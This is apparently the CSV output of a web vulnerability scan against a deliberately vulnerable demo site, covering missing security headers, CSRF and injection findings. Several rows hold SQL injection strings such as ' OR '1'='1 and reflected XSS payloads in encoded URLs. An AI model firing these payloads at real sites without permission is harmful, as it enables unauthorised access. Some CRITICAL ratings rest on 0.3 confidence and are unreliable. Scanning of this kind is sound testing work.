ID,Type,Severity,Risk_Score,URL,Payload,Description,Evidence,Timestamp,Scan_ID,Confidence,Public_Facing,Auth_Required,Sensitive_Data
1,Security Misconfiguration,HIGH,7.92,http://testphp.vulnweb.com/artists.php?artist=1,HTTP_ONLY,Site não utiliza HTTPS,Conexão não criptografada detectada,2025-10-28T17:18:52.110685,4e4d235a,N/A,True,Unknown,True
2,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+OR+%271%27%3D%271,' OR '1'='1,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:52.576120,4e4d235a,0.3,True,Unknown,True
3,Cross-Site Request Forgery,MEDIUM,5.984000000000001,http://testphp.vulnweb.com/search.php?test=query,NO_CSRF_TOKEN,Formulário sem proteção CSRF,Token CSRF não encontrado em formulário POST,2025-10-28T17:18:52.615351,4e4d235a,N/A,True,True,Unknown
4,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+OR+1%3D1--,' OR 1=1--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:52.821679,4e4d235a,0.3,True,Unknown,True
5,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,NO_FRAME_PROTECTION,Falta de proteção contra Clickjacking,Headers X-Frame-Options ou CSP frame-ancestors não encontrados,2025-10-28T17:18:52.846404,4e4d235a,N/A,True,Unknown,Unknown
6,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,<script>alert('XSS')</script>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.60,2025-10-28T17:18:52.860769,4e4d235a,0.6,True,False,Unknown
7,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27+OR+%27x%27%3D%27x,' OR 'x'='x,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:53.057838,4e4d235a,0.3,True,Unknown,True
8,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_X_CONTENT_TYPE_OPTIONS,Cabeçalho de segurança ausente: X-Content-Type-Options,O cabeçalho X-Content-Type-Options não foi encontrado na resposta,2025-10-28T17:18:53.093299,4e4d235a,N/A,True,Unknown,Unknown
9,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_X_XSS_PROTECTION,Cabeçalho de segurança ausente: X-XSS-Protection,O cabeçalho X-XSS-Protection não foi encontrado na resposta,2025-10-28T17:18:53.093355,4e4d235a,N/A,True,Unknown,Unknown
10,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_X_FRAME_OPTIONS,Cabeçalho de segurança ausente: X-Frame-Options,O cabeçalho X-Frame-Options não foi encontrado na resposta,2025-10-28T17:18:53.093381,4e4d235a,N/A,True,Unknown,Unknown
11,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_STRICT_TRANSPORT_SECURITY,Cabeçalho de segurança ausente: Strict-Transport-Security,O cabeçalho Strict-Transport-Security não foi encontrado na resposta,2025-10-28T17:18:53.093470,4e4d235a,N/A,True,Unknown,Unknown
12,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_CONTENT_SECURITY_POLICY,Cabeçalho de segurança ausente: Content-Security-Policy,O cabeçalho Content-Security-Policy não foi encontrado na resposta,2025-10-28T17:18:53.093492,4e4d235a,N/A,True,Unknown,Unknown
13,Security Misconfiguration,MEDIUM,6.6000000000000005,http://testphp.vulnweb.com/artists.php?artist=1,MISSING_REFERRER_POLICY,Cabeçalho de segurança ausente: Referrer-Policy,O cabeçalho Referrer-Policy não foi encontrado na resposta,2025-10-28T17:18:53.093511,4e4d235a,N/A,True,Unknown,Unknown
14,XSS,CRITICAL,9.350000000000001,http://testphp.vulnweb.com/artists.php?artist=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E,<img src=x onerror=alert('XSS')>,Cross-Site Scripting no parâmetro 'artist',Payload refletido na resposta. Confiança: 0.30,2025-10-28T17:18:53.114554,4e4d235a,0.3,True,False,Unknown
15,SQL Injection,CRITICAL,10.0,http://testphp.vulnweb.com/artists.php?artist=%27%29+OR+%271%27%3D%271--,') OR '1'='1--,SQL Injection no parâmetro 'artist',Erro SQL detectado ou comportamento suspeito. Confiança: 0.30,2025-10-28T17:18:53.315364,4e4d235a,0.3,True,Unknown,True
